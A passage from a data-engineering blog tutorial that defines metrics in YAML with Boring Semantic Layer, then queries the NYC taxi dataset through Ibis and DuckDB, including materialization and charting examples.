10.1048C2.50238 9.09977 2.39347 7.9939 2.60568 6.927C2.8179 5.86011 3.34173 4.8801 4.11092 4.11091C4.8801 3.34172 5.86011 2.8179 6.92701 2.60568C7.9939 2.39346 9.09977 2.50238 10.1048 2.91866C11.1098 3.33494 11.9687 4.03989 12.5731 4.94436C13.1774 5.84883 13.5 6.9122 13.5 8C13.4983 9.45818 12.9184 10.8562 11.8873 11.8873C10.8562 12.9184 9.45819 13.4983 8 13.5ZM9 11C9 11.1326 8.94732 11.2598 8.85356 11.3536C8.75979 11.4473 8.63261 11.5 8.5 11.5C8.23479 11.5 7.98043 11.3946 7.7929 11.2071C7.60536 11.0196 7.5 10.7652 7.5 10.5V8C7.36739 8 7.24022 7.94732 7.14645 7.85355C7.05268 7.75979 7 7.63261 7 7.5C7 7.36739 7.05268 7.24021 7.14645 7.14645C7.24022 7.05268 7.36739 7 7.5 7C7.76522 7 8.01957 7.10536 8.20711 7.29289C8.39465 7.48043 8.5 7.73478 8.5 8V10.5C8.63261 10.5 8.75979 10.5527 8.85356 10.6464C8.94732 10.7402 9 10.8674 9 11ZM7 5.25C7 5.10166 7.04399 4.95666 7.1264 4.83332C7.20881 4.70999 7.32595 4.61386 7.46299 4.55709C7.60003 4.50032 7.75083 4.48547 7.89632 4.51441C8.04181 4.54335 8.17544 4.61478 8.28033 4.71967C8.38522 4.82456 8.45665 4.9582 8.48559 5.10368C8.51453 5.24917 8.49968 5.39997 8.44291 5.53701C8.38615 5.67406 8.29002 5.79119 8.16668 5.8736C8.04334 5.95601 7.89834 6 7.75 6C7.55109 6 7.36032 5.92098 7.21967 5.78033C7.07902 5.63968 7 5.44891 7 5.25Z" fill="#383838"></path></svg> <span>INFO<!-- -->: Data Catalogs</span></span>
If you wonder how <a href="https://ducklake.select/">DuckLake</a> or other open table format catalogs (Iceberg, Unity, Polaris) fit into the picture, they would be connected to the metrics definition. Hence, the catalog has the complete list of available data assets. You can view open data catalogs as a lookup service for the datasets in your data lake. If you use a semantic layer as we implement here, you won't need an additional catalog because all your metrics and dimensions are defined within the semantic layer itself.
</span><section><h3 id="getting-started">Getting Started</h3><p>Let's create a virtual environment where we install our dependencies and install the semantic layer:</p><pre><code>git <span>clone</span> git@github.com:sspaeti/semantic-layer-duckdb.git
uv <span>sync</span> <span>#installs dependencies</span>
</code></pre><p>That will not only install the semantic layer, but also Ibis and other requirements.</p><p>Now we are ready to define our metrics. To simplify this example and focus on the metrics rather than the data, I utilized the <a href="https://www.nyc.gov/site/tlc/about/tlc-trip-record-data.page">NYC Taxi Dataset</a>, which we all know and are familiar with. They have a lookup table for pickups and lots of data we can use, and it is available via HTTPS.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: You can use MotherDuck Shared datasets</span></span>
If you want to use MotherDuck's shared datasets, please check out <a href="https://motherduck.com/docs/getting-started/sample-data-queries/datasets/">Example Datasets</a>, for example the <a href="https://motherduck.com/docs/getting-started/sample-data-queries/nyc-311-data/">NYC 311 Service Requests Data</a> is uploaded, as well as <a href="https://motherduck.com/docs/getting-started/sample-data-queries/foursquare/">Foursquare</a> and other helpful ones. You can query this data instantly by running duckdb and connecting to MotherDuck as showcased below:
<img alt="MotherDuck DuckDB Query Example" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=3840&amp;q=75">
</span><p>As we know now, semantic layers are suitable for defining metrics in a central and configurable way, so we use YAML for this. YAML has minimal overhead and is easy to read, which is why most semantic layers use it. Alternatively, SQL would be a better choice, but it lacks essential features like variables and tends to become overly nested and challenging to maintain. YAML, combined with occasional SQL injection, proves to be the most effective solution.</p><p>First, let's check out what data we are working with—we can quickly count and describe the tables:</p><pre><code>D <span>select</span> count(*) FROM read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>);
┌─────────────────┐
│  count_star()   │
│      int64      │
├─────────────────┤
│    19868009     │
│ (19.87 million) │
└─────────────────┘
D DESCRIBE FROM read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>);
┌──────────────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐
│     column_name      │ column_type │  null   │   key   │ default │  extra  │
│       varchar        │   varchar   │ varchar │ varchar │ varchar │ varchar │
├──────────────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤
│ hvfhs_license_num    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ dispatching_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ originating_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ request_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ on_scene_datetime    │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ pickup_datetime      │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ dropoff_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ PULocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │
│ DOLocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │
│ trip_miles           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ trip_time            │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │
│ base_passenger_fare  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ tolls                │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ bcf                  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ sales_tax            │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ congestion_surcharge │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ airport_fee          │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ tips                 │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ driver_pay           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ shared_request_flag  │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ shared_match_flag    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ access_a_ride_flag   │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ wav_request_flag     │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ wav_match_flag       │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ cbd_congestion_fee   │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
├──────────────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┤
│ 25 rows                                                          6 columns │
└────────────────────────────────────────────────────────────────────────────┘
</code></pre><p>As well as the CSV lookups:</p><pre><code>D <span>select</span> count(*) from read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>);
┌──────────────┐
│ count_star() │
│    int64     │
├──────────────┤
│     265      │
└──────────────┘
D describe from read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>);
┌──────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐
│ column_name  │ column_type │  null   │   key   │ default │  extra  │
│   varchar    │   varchar   │ varchar │ varchar │ varchar │ varchar │
├──────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤
│ LocationID   │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │
│ Borough      │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ Zone         │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ service_zone │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
└──────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┘
</code></pre><p>This gives us a good sense of what we are dealing with. From the <a href="https://www.nyc.gov/assets/tlc/downloads/pdf/data_dictionary_trip_records_hvfhs.pdf">data dictionary</a>, we understand that <code>PULocationID</code> and <code>DOLocationID</code> represent the Taxi zones to be joined with the above zone lookup by the column <code>LocationID</code>.</p><p>Usually what I do next is use the <a href="https://duckdb.org/docs/stable/guides/meta/summarize.html"><code>SUMMARIZE</code> command</a>, which is a DuckDB-specific query type that gives us statistics about the data such as <code>min</code>,&nbsp;<code>max</code>,&nbsp;<code>approx_unique</code>,&nbsp;<code>avg</code>,&nbsp;<code>std</code>,&nbsp;<code>q25</code>,&nbsp;<code>q50</code>,&nbsp;<code>q75</code>,&nbsp;<code>count</code>. This gives us a fast and handy overview of what we are dealing with.</p><section><h4 id="defining-metrics-in-boring-semantic-layer">Defining Metrics in Boring Semantic Layer</h4><p>Next, we can start defining our metrics. Let's start by setting the timestamp and its granularity (required by BSL), followed by the dimensions, which looks something like this:</p><pre><code><span>fhvhv_trips:</span>
  <span>table:</span> <span>trips_tbl</span>
  <span>time_dimension:</span> <span>pickup_datetime</span>
  <span>smallest_time_grain:</span> <span>TIME_GRAIN_SECOND</span>
  
  <span>dimensions:</span>
    <span>hvfhs_license_num:</span> <span>_.hvfhs_license_num</span>
    <span>dispatching_base_num:</span> <span>_.dispatching_base_num</span>
    <span>originating_base_num:</span> <span>_.originating_base_num</span>
    <span>request_datetime:</span> <span>_.request_datetime</span>
    <span>pickup_datetime:</span> <span>_.pickup_datetime</span>
    <span>dropoff_datetime:</span> <span>_.dropoff_datetime</span>
    <span>trip_miles:</span> <span>_.trip_miles</span>
    <span>trip_time:</span> <span>_.trip_time</span>
    <span>base_passenger_fare:</span> <span>_.base_passenger_fare</span>
    <span>tolls:</span> <span>_.tolls</span>
    <span>bcf:</span> <span>_.bcf</span>
    <span>sales_tax:</span> <span>_.sales_tax</span>
    <span>congestion_surcharge:</span> <span>_.congestion_surcharge</span>
    <span>airport_fee:</span> <span>_.airport_fee</span>
    <span>tips:</span> <span>_.tips</span>
    <span>driver_pay:</span> <span>_.driver_pay</span>
    <span>shared_request_flag:</span> <span>_.shared_request_flag</span>
    <span>shared_match_flag:</span> <span>_.shared_match_flag</span>
    <span>access_a_ride_flag:</span> <span>_.access_a_ride_flag</span>
    <span>wav_request_flag:</span> <span>_.wav_request_flag</span>
    <span>wav_match_flag:</span> <span>_.wav_match_flag</span>
</code></pre><p>The <code>pickup_datetime</code> is the time column, with the grain set to seconds, and all other columns are treated as dimensions.</p><p>The interesting part is when we set the measures, which are the calculations, that can become very complex and potentially depend on many layers of existing measures. This is how we define our measures:</p><pre><code>  <span>measures:</span>
    <span>trip_count:</span> <span>_.count()</span>
    <span>avg_trip_miles:</span> <span>_.trip_miles.mean()</span>
    <span>avg_trip_time:</span> <span>_.trip_time.mean()</span>
    <span>avg_base_fare:</span> <span>_.base_passenger_fare.mean()</span>
    <span>total_revenue:</span> <span>_.base_passenger_fare.sum()</span>
    <span>avg_tips:</span> <span>_.tips.mean()</span>
    <span>avg_driver_pay:</span> <span>_.driver_pay.mean()</span>
</code></pre><p>And some more that only aggregate flagged data, such as shared trip or wheelchair requested:</p><pre><code>    <span>shared_trip_rate:</span> <span>(_.shared_match_flag</span> <span>==</span> <span>'Y'</span><span>).mean()</span>
    <span>wheelchair_request_rate:</span> <span>(_.wav_request_flag</span> <span>==</span> <span>'Y'</span><span>).mean()</span>
</code></pre><p>To create a functional dashboard and drill down into different angles, we need <strong>dimensions</strong> that provide more context when querying data. For example, if we want to aggregate on <strong>borough</strong> in New York City, this information is not in the trips data, but in our lookup table, as we saw in the above <code>DESCRIBE</code>. Let's now join this table and use this information.</p><p>First, we define the additional dataset in the YAML as follows:</p><pre><code><span>taxi_zones:</span>
  <span>table:</span> <span>taxi_zones_tbl</span>
  <span>primary_key:</span> <span>LocationID</span>
  
  <span>dimensions:</span>
    <span>location_id:</span> <span>_.LocationID</span>
    <span>borough:</span> <span>_.Borough</span>
    <span>zone:</span> <span>_.Zone</span>
    <span>service_zone:</span> <span>_.service_zone</span>
    
  <span>measures:</span>
    <span>zone_count:</span> <span>_.count()</span>
</code></pre><p>Lastly, we need to join the two datasets. This can be specified like this - added to the <code>fhvhv_trips</code> dataset:</p><pre><code>  <span>joins:</span>
    <span>pickup_zone:</span>
      <span>model:</span> <span>taxi_zones</span>
      <span>type:</span> <span>one</span>
      <span>with:</span> <span>_.PULocationID</span>
</code></pre></section></section><section><h3 id="query-data-through-pythonibis-and-duckdb">Query Data through Python/Ibis and DuckDB</h3><p>Next, we need to set up our execution logic—which is Python code in this case—and use the translation layer Ibis to run DuckDB queries as our SQL engine locally.</p><p>I'll explain the most important steps here, but I'll skip some details—the full script you can find in <a href="https://github.com/sspaeti/semantic-layer-duckdb/blob/main/nyc_taxi.py">nyc_taxi.py</a>. First, we import Ibis and our <code>SemanticModel</code> class from Boring Semantic Layer and we define the datasets and execution engine via Ibis—again, here we use DuckDB and read the dataset directly from <a href="https://aws.amazon.com/cloudfront/">CloudFront</a>:</p><pre><code><span>import</span> ibis
<span>from</span> boring_semantic_layer <span>import</span> SemanticModel

con = ibis.duckdb.connect(<span>":memory:"</span>) <span>#or use `"md:"` for MotherDuck engine</span>
tables = {
    <span>"taxi_zones_tbl"</span>: con.read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>),
    <span>"trips_tbl"</span>: con.read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>),
}
</code></pre><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: Scale Up with MotherDuck</span></span>
With one simple change, we can use MotherDuck as the <a href="https://ibis-project.org/backends/duckdb#motherduck">Ibis query engine</a>. Instead of `con = ibis.duckdb.connect(":memory:")`, we can use `con = ibis.duckdb.connect("md:")`
</span><p>Now that we have read the metrics definition we created in the YAML <code>nyc_taxi.yml</code> file above and mapped it to the tables dataset, the boring semantic layer knows which dataset we have and can query it:</p><pre><code>models = SemanticModel.from_yaml(<span>f"nyc_taxi.yml"</span>, tables=tables)

taxi_zones_sm = models[<span>"taxi_zones"</span>] <span>#dataset name from the yaml file</span>
trips_sm = models[<span>"fhvhv_trips"</span>] 
</code></pre><p>And then we define our query as a Python expression with Ibis and BSL—here the <strong>trip volume by pickup borough</strong>:</p><pre><code>expr = trips_sm.query(
  dimensions=[<span>"pickup_zone.borough"</span>],
  measures=[<span>"trip_count"</span>, <span>"avg_trip_miles"</span>, <span>"avg_base_fare"</span>],
  order_by=[(<span>"trip_count"</span>, <span>"desc"</span>)],
  limit=<span>5</span>,
)
</code></pre><p>And we can execute and print it with:</p><pre><code><span>print</span>(expr.execute())
</code></pre><p>The result looks something like this:</p><pre><code>  pickup_zone_borough  trip_count  avg_trip_miles  avg_base_fare
0           Manhattan     7122571        5.296985      33.575738
1            Brooklyn     5433158        4.215820      23.280429
2              Queens     4453220        6.379047      29.778835
3               Bronx     2541614        4.400500      20.313596
4       Staten Island      316533        5.262288      22.200712
</code></pre><p>So what just happened? We defined the dimension (<code>pickup_zone.borough</code>) in which we want to display the measure, configured the three measures to be shown, and specified the order and the number of rows to return with LIMIT.</p><p>The magic is that we can now change the metric in the YAML file, add a CASE WHEN statement, or fix a formatting error all without touching the query or code. Less technical people gain access through a <a href="https://en.wikipedia.org/wiki/Domain-specific_language">DSL (Domain Specific Language)</a> and a separate configuration file, which we can version control, collaborate on, or even utilize LLMs to create new measures and dimensions.</p><p>Ibis gives us the flexibility to do it in a Pythonic way.</p><p>Find more examples such as the popular pickup zones, service zone analysis, revenue analysis by trip distance, and accessibility metrics in the whole script <code>nyc_taxi.py</code> and yaml in <code>nyc_taxi.yml</code>.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 12C16.5523 12 17 12.4477 17 13V18C17 18.5523 16.5523 19 16 19C15.4477 19 15 18.5523 15 18V13C15 12.4477 15.4477 12 16 12Z" fill="#383838"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M14.5013 3.40279C14.9567 3.13875 15.4737 2.99969 16 2.99969C16.5264 2.99969 17.0434 3.13875 17.4987 3.40279C17.9532 3.66638 18.3302 4.04519 18.5916 4.50099C18.592 4.50176 18.5925 4.50253 18.5929 4.50331L29.591 23.5C29.8539 23.9553 29.9925 24.4716 29.993 24.9974C29.9934 25.5231 29.8557 26.0397 29.5937 26.4954C29.3316 26.9512 28.9544 27.3301 28.4998 27.5941C28.0452 27.8582 27.5292 27.9981 27.0035 28L27 28H5.00001L4.99648 28C4.47077 27.9981 3.95477 27.8582 3.50019 27.5941C3.0456 27.3301 2.66838 26.9512 2.40633 26.4954C2.14428 26.0397 2.00658 25.5231 2.00705 24.9974C2.00752 24.4716 2.14612 23.9553 2.40898 23.5L13.4071 4.50331C13.4075 4.50253 13.408 4.50176 13.4084 4.50099C13.6698 4.04519 14.0468 3.66638 14.5013 3.40279ZM14.275 5L15.1404 5.50104L4.14103 24.5C4.14095 24.5001 4.1411 24.4999 4.14103 24.5C4.05355 24.6517 4.00721 24.824 4.00705 24.9991C4.00689 25.1744 4.05279 25.3466 4.14014 25.4985C4.2275 25.6504 4.35323 25.7767 4.50476 25.8647C4.6559 25.9525 4.8274 25.9992 5.00216 26H26.9978C27.1726 25.9992 27.3441 25.9525 27.4953 25.8647C27.6468 25.7767 27.7725 25.6504 27.8599 25.4985C27.9472 25.3466 27.9931 25.1744 27.993 24.9991C27.9928 24.8241 27.9467 24.6522 27.8593 24.5006C27.8592 24.5004 27.8594 24.5008 27.8593 24.5006L16.8571 5.49671C16.7707 5.3457 16.6459 5.22021 16.4954 5.13293C16.3449 5.04565 16.174 4.99969 16 4.99969C15.826 4.99969 15.6551 5.04565 15.5046 5.13293C15.3541 5.22021 15.2293 5.3457 15.1429 5.4967L14.275 5Z" fill="#383838"></path><path d="M16 24C16.8284 24 17.5 23.3284 17.5 22.5C17.5 21.6716 16.8284 21 16 21C15.1716 21 14.5 21.6716 14.5 22.5C14.5 23.3284 15.1716 24 16 24Z" fill="#383838"></path></svg> <span>WARNING<!-- -->: Limitations</span></span>
I <a href="https://github.com/boringdata/boring-semantic-layer/issues/32">wasn't able</a> to join the dataset twice, once for pickup and once for drop-off locations. That's why I only joined it once in this example.
</span></section><section><h3 id="materialization">Materialization</h3><p>If you wish to speed things up and create a <strong>persistent cube</strong>, the option is there with the help of <a href="https://github.com/xorq-labs/xorq">Xorq</a>—example from <a href="https://github.com/boringdata/boring-semantic-layer/blob/main/examples/example_materialize.py">example_materialize.py</a>.</p><pre><code><span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>xorq</span> <span>as</span> <span>xo</span>

<span>from</span> <span>boring_semantic_layer</span> <span>import</span> <span>SemanticModel</span>

<span>df</span> <span>=</span> <span>pd.DataFrame(</span>
    {
        <span>"date":</span> <span>pd.date_range("2025-01-01"</span>, <span>periods=5</span>, <span>freq="D")</span>,
        <span>"region":</span> [<span>"north"</span>, <span>"south"</span>, <span>"north"</span>, <span>"east"</span>, <span>"south"</span>],
        <span>"sales":</span> [<span>100</span>, <span>200</span>, <span>150</span>, <span>300</span>, <span>250</span>],
    }
<span>)</span>

<span>con</span> <span>=</span> <span>xo.connect()</span>
<span>tbl</span> <span>=</span> <span>con.create_table("sales",</span> <span>df)</span>

<span>sales_model</span> <span>=</span> <span>SemanticModel(</span>
    <span>table=tbl,</span>
    <span>dimensions={"region":</span> <span>lambda t:</span> <span>t.region,</span> <span>"date":</span> <span>lambda t:</span> <span>t.date},</span>
    <span>measures={</span>
        <span>"total_sales":</span> <span>lambda t:</span> <span>t.sales.sum(),</span>
        <span>"order_count":</span> <span>lambda t:</span> <span>t.sales.count(),</span>
    <span>},</span>
    <span>time_dimension="date",</span>
    <span>smallest_time_grain="TIME_GRAIN_DAY",</span>
<span>)</span>

<span>cube</span> <span>=</span> <span>sales_model.materialize(</span>
    <span>time_grain="TIME_GRAIN_DAY",</span>
    <span>cutoff="2025-01-04",</span>
    <span>dimensions=["region",</span> <span>"date"</span><span>],</span>
    <span>storage=None,</span>
<span>)</span>

<span>print("Cube</span> <span>model</span> <span>definition:",</span> <span>cube.json_definition)</span>

<span>df_cube</span> <span>=</span> <span>cube.query(</span>
    <span>dimensions=["date",</span> <span>"region"</span><span>],</span> <span>measures=["total_sales",</span> <span>"order_count"</span><span>]</span>
<span>).execute()</span>
</code></pre></section><section><h3 id="more-complex-measures">More Complex Measures</h3><p>This example is relatively simple, but showcases how you can use a simple semantic layer on top of your data lake with DuckDB.</p><p>If you need more advanced measures that are <strong>dependent on each other</strong>, you can imagine how beneficial it would be. The beauty of semantic layers lies in their ability to simply define dependencies on complex measures, eliminating the need to repeat 100 lines of SQL code in your CTE query.</p><p>Obviously, you could use dbt to manage dependencies, but you wouldn't have the ad hoc query capability, the on-the-fly filtering, or nicely defined YAML files that represent your dynamic queries.</p></section><section><h3 id="visualizing">Visualizing</h3><p>Interestingly, the BSL also includes some visualization capabilities with a built-in wrapper around&nbsp;<strong><a href="https://vega.github.io/vega-lite/">Vega-Lite</a></strong>&nbsp;(JSON-based grammar for creating interactive visualizations that provides a declarative approach to chart creation) and its Python wrapper&nbsp;<strong><a href="https://altair-viz.github.io/">Altair</a></strong>.</p><p>Just install with <code>uv add 'boring-semantic-layer[visualization]' altair[all]</code> and you can create a simple visualization. This is a bit extended to create a nice-looking image, but you can imagine this being much shorter with only the title, for example:</p><pre><code><span># Charting example</span>
png_bytes = expr.chart(
  <span>format</span>=<span>"png"</span>,  <span># Add format parameter here</span>
  spec={
	<span>"title"</span>: {
	    <span>"text"</span>: <span>"NYC Taxi Trip Volume by Borough"</span>,
	    <span>"fontSize"</span>: <span>16</span>,
	    <span>"fontWeight"</span>: <span>"bold"</span>,
	    <span>"anchor"</span>: <span>"start"</span>
	},
	<span>"mark"</span>: {
	    <span>"type"</span>: <span>"bar"</span>,
	    <span>"color"</span>: <span>"#2E86AB"</span>,
	    <span>"cornerRadiusEnd"</span>: <span>4</span>
	},
	<span>"encoding"</span>: {
	    <span>"x"</span>: {
		  <span>"field"</span>: <span>"pickup_zone_borough"</span>,
		  <span>"type"</span>: <span>"nominal"</span>,
		  <span>"sort"</span>: <span>"-y"</span>,
		  <span>"title"</span>: <span>"Borough"</span>,
		  <span>"axis"</span>: {
			<span>"labelAngle"</span>: -<span>45</span>,
			<span>"titleFontSize"</span>: <span>12</span>,
			<span>"labelFontSize"</span>: <span>10</span>
		  }
	    },
	    <span>"y"</span>: {
		  <span>"field"</span>: <span>"trip_count"</span>,
		  <span>"type"</span>: <span>"quantitative"</span>,
		  <span>"title"</span>: <span>"Number of Trips"</span>,
		  <span>"axis"</span>: {
			<span>"format"</span>: <span>".2s"</span>,
			<span>"titleFontSize"</span>: <span>12</span>,
			<span>"labelFontSize"</span>: <span>10</span>
		  }
	    }
	},
	<span>"width"</span>: <span>500</span>,
	<span>"height"</span>: <span>350</span>,
	<span>"background"</span>: <span>"#FAFAFA"</span>
  }
)

<span># Save as file</span>
<span>with</span> <span>open</span>(<span>"trip-volume-by-pickup-borough-styled.png"</span>, <span>"wb"</span>) <span>as</span> f:
  f.write(png_bytes)

</code></pre><p>The generated PNG looks like this:
<img alt="image" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
